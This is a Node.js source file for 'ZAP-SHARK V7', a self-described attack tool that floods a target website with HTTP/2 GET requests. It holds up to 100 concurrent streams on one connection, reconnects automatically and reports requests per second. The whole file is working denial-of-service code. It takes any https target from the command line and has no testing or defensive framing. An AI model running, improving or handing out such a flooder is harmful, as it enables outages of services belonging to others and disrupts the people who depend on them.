const http2 = require('http2');

class ZAPSHARK_V7_RAW {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // RAW H2 SETTINGS
        this.client = null;
        this.activeStreams = 0;
        this.maxStreams = 100;
        
        // SIMPLE METRICS
        this.connectionAttempts = 0;
        this.lastDisplayUpdate = Date.now();
        
        this.attackInterval = null;
    }

    // === RAW CONNECTION ===
    connect() {
        try {
            this.client = http2.connect(this.targetUrl);
            console.log('[+] H2 Connected');
            
            this.client.on('error', (err) => {
                console.log('[-] Connection error:', err.code);
                this.reconnect();
            });
            
            this.client.on('close', () => {
                this.reconnect();
            });
            
            return true;
        } catch (err) {
            console.log('[-] Failed to connect:', err.code);
            this.reconnect();
            return false;
        }
    }

    reconnect() {
        if (this.client) {
            try { this.client.destroy(); } catch (e) {}
            this.client = null;
        }
        
        setTimeout(() => {
            this.connectionAttempts++;
            console.log(`[~] Reconnect attempt ${this.connectionAttempts}`);
            this.connect();
        }, 2000);
    }

    // === RAW ATTACK ===
    sendRequest() {
        if (!this.client || this.activeStreams >= this.maxStreams) return;
        
        try {
            this.activeStreams++;
            
            const req = this.client.request({
                ':method': 'GET',
                ':path': '/'
            });
            
            req.on('response', () => {
                req.destroy();
            });
            
            req.on('error', () => {
                req.destroy();
            });
            
            req.on('close', () => {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            });
            
            req.end();
            
        } catch (err) {
            this.activeStreams--;
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    // === STATS ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const runtimeStr = this.formatRuntime();
        const sockets = this.client ? this.activeStreams : -1;
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log('ZAP-SHARK V7 | RAW H2');
        console.log('============================');
        console.log(`TRS — ${this.totalRequests}`);
        console.log(`RPS — ${this.currentRPS.toFixed(1)}`);
        console.log('============================');
        console.log(`SOCKETS: ${sockets}/${this.maxStreams}`);
        console.log(`RUNTIME: ${runtimeStr}`);
        console.log('============================');
    }

    // === MAIN ===
    start() {
        console.log('=== ZAP-SHARK V7 | RAW H2 ===');
        console.log('Target:', this.targetUrl);
        console.log('Strategy: Single H2, Max Streams');
        console.log('='.repeat(40));
        
        if (!this.connect()) {
            console.log('[-] Initial connection failed');
            return;
        }
        
        setTimeout(() => {
            if (!this.client) {
                console.log('[-] No connection after timeout');
                return;
            }
            
            console.log('[+] Starting attack...');
            
            this.attackInterval = setInterval(() => {
                if (this.client) {
                    // SEND MULTIPLE REQUESTS PER TICK
                    for (let i = 0; i < 5; i++) {
                        this.sendRequest();
                    }
                    this.updateDisplay();
                }
            }, 0.1);
            
            // DISPLAY UPDATE
            setInterval(() => {
                this.updateDisplay();
            }, 100);
            
        }, 3000);
        
        process.on('SIGINT', () => {
            console.log('\n\n=== FINAL STATS ===');
            console.log(`Total Requests: ${this.totalRequests}`);
            console.log(`Peak RPS: ${this.currentRPS.toFixed(1)}`);
            console.log(`Runtime: ${this.formatRuntime()}`);
            console.log('='.repeat(40));
            
            this.running = false;
            clearInterval(this.attackInterval);
            
            if (this.client) {
                try { this.client.destroy(); } catch (e) {}
            }
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v7.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V7_RAW(target);
shark.start();
